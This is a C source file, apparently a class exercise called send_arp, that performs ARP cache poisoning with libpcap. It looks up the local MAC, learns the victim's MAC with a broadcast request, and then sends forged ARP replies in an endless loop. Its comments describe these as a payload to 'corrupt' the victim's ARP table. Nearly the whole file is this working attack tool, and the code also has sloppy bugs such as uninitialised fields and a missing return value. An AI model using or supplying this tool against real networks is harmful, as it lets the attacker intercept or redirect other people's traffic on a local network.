#include <pcap/pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/if_ether.h>
#include <net/if.h>
#include <arpa/inet.h>

typedef struct _ARP_ {
    uint16_t 	hw_type;
    uint16_t	p_type;
    uint8_t		hw_len;
    uint8_t		p_len;
    uint16_t	opcode;
    uint8_t		sender_MAC[6];
    uint8_t		sender_IP[4];
    uint8_t		target_MAC[6];
    uint8_t		target_IP[4];
} ARP;

#define ARP_REQ		1
#define ARP_REP		2
// #define RARP_REQ	3
// #define RARP_REP	4
#define Unknown		0x00
#define Broadcast	0xff
#define GET_MAC		1
#define SEND_ONLY	0

void usage()
{
    puts(":: ./send_arp <interface> <sender_ip> <target_ip>");
    exit(0);
}

void show_mac(uint8_t* mac)
{
    printf("[ %02x:%02x:%02x:%02x:%02x:%02x ]\n", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

// Generate payload
uint8_t* gen_pay(int len)
{
    uint8_t* ret = NULL;
    ret = (uint8_t*)malloc(len * sizeof(uint8_t));

    if(ret == NULL)
        exit(0);
    memset(ret, 0, len * sizeof(uint8_t));

    return ret;
}

// source : http://www.drk.com.ar/code/get-mac-address-in-linux.php
uint8_t* get_mac(char *interface)
{
    uint8_t* tmp = gen_pay(6);
    struct ifreq ifr;
    int socket_;
    if ((socket_ = socket(AF_INET, SOCK_STREAM,0)) < 0)
        exit(0);
    strcpy(ifr.ifr_name, interface);
    if (ioctl(socket_, SIOCGIFHWADDR, &ifr) < 0)
        exit(0);
    memcpy(tmp, ifr.ifr_hwaddr.sa_data, 6 * sizeof(uint8_t));
    close(socket_);
    return tmp;
}

// source : https://stackoverflow.com/questions/2283494/get-ip-address-of-an-interface-on-linux
char* get_ip(char *interface)
{
    char* tmp = NULL;
    tmp = (char*)malloc(16 * sizeof(char));

    int socket_;
    struct ifreq ifr;
    socket_ = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);
    ioctl(socket_, SIOCGIFADDR, &ifr);
    close(socket_);

    strcpy(tmp, inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
    return tmp;
}

// Generate ARP with its header format
ARP* gen_arp(uint8_t* sender_mac, uint8_t* target_mac, int opcode)
{
    ARP* my_arp = NULL;
    my_arp = (ARP*)malloc(sizeof(ARP));
    memcpy(my_arp->sender_MAC, sender_mac, 6 * sizeof(uint8_t));
    if (target_mac == Unknown)
        memset(my_arp->target_MAC, 0x00, 6 * sizeof(uint8_t));
    else
        memcpy(my_arp->target_MAC, target_mac, 6 * sizeof(uint8_t));

    my_arp->hw_type = htons(1);
    my_arp->p_type = htons(ETH_P_IP);
    my_arp->hw_len = 6;
    my_arp->p_len = 4;
    my_arp->opcode = htons(opcode);
    return my_arp;
}

// Generate ETH with its header format
uint8_t* gen_eth(uint8_t* dst_mac, uint8_t* src_mac, ARP* my_arp)
{
    uint8_t* my_eth = gen_pay(1000);
    if(dst_mac == Broadcast)
        memcpy(my_eth, "\xff\xff\xff\xff\xff\xff", 6 * sizeof(uint8_t));
    else
        memcpy(my_eth, dst_mac, 6 * sizeof(uint8_t));
    memcpy(my_eth + 6, src_mac, 6 * sizeof(uint8_t));
    my_eth[12] = 0x08;
    my_eth[13] = 0x06;
    memcpy(my_eth + 14, my_arp, sizeof(ARP));

    return my_eth;
}

// Send mypackt & get MAC addr
uint8_t* send_packet(uint8_t* request, char* interface, struct pcap_pkthdr* header, int flag)
{
    pcap_t *handle;
    char errbuf[PCAP_ERRBUF_SIZE];
    const uint8_t *packet;
    uint8_t *mac = NULL;
    mac = gen_pay(6);

    handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
    if (pcap_sendpacket(handle, request, 60))
    {
        fprintf(stderr, "Error sending the packet: %s\n", pcap_geterr(handle));
        exit(1);
    }

    if(flag == SEND_ONLY)
            while(1)
            pcap_sendpacket(handle, request, 60);

    // Get MAC addr
    while (1)
    {
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;
        if(packet[12] == 0x08 && packet[13] == 0x06)
        {
            memcpy(mac, &packet[6], 6 * sizeof(uint8_t));
            pcap_close(handle);
            return mac;
        }
    }
}

int main(int argc, char *argv[])
{
    // Show usage
    if (argc < 4)
        usage();

    uint8_t* sender_mac = NULL;
    uint8_t* target_mac = NULL;
    uint8_t* my_eth = NULL;

    ARP* my_arp = NULL;
    my_arp = (ARP*)malloc(sizeof(ARP));

    // Get my MAC addr
    uint8_t* my_mac = NULL;
    my_mac = gen_pay(6);
    my_mac = get_mac(argv[1]);
    my_arp = gen_arp(my_mac, Unknown, ARP_REQ);

    // Get my IP addr
    char* my_ip;
    my_ip = gen_pay(16);
    my_ip = get_ip(argv[1]);

    // Show info
    printf(":: S_MAC\t: ");	show_mac(my_arp->sender_MAC);
    printf(":: D_MAC\t: ");	show_mac(my_arp->target_MAC);
    printf(":: SEN_IP\t: [ %s ]\n", my_ip);
    printf(":: TAR_IP\t: [ %s ]\n", argv[2]);
    // Parsing IP addr(string to integer)
    inet_pton(AF_INET, my_ip, my_arp->sender_IP);
    inet_pton(AF_INET, argv[2], my_arp->target_IP);

    // Generate payload to get victim's MAC addr
    struct pcap_pkthdr *header;
    my_eth = gen_eth(Broadcast, my_mac, my_arp);

    // Get MAC addr with flag(GET_MAC)
    sender_mac = send_packet(my_eth, argv[1], header, GET_MAC);
    printf("\n:: VIC'S MAC\t: ");
    show_mac(sender_mac);

    // Generate payload to corrupt ARP table
    uint8_t* ex = NULL;
    ARP* my_arp_2 = NULL;
    my_arp_2 = (ARP*)malloc(sizeof(ARP));
    my_arp_2 = gen_arp(my_mac, sender_mac, ARP_REP);

    // Show info
    printf(":: S_MAC\t: ");	show_mac(my_arp_2->sender_MAC);
    printf(":: D_MAC\t: ");	show_mac(my_arp_2->target_MAC);
    printf(":: SEN_IP\t: [ %s ]\n", argv[3]);
    printf(":: TAR_IP\t: [ %s ]\n", argv[2]);

    // Parsing IP addr(string to integer)
    inet_pton(AF_INET, argv[3], my_arp_2->sender_IP);
    inet_pton(AF_INET, argv[2], my_arp_2->target_IP);

    // Send payload to corrupt ARP table
    ex = gen_eth(my_arp_2->target_MAC, my_arp_2->sender_MAC, my_arp_2);
    send_packet(ex, argv[1], header, 0);

    printf(":: EOF\n");
    return 0;
}
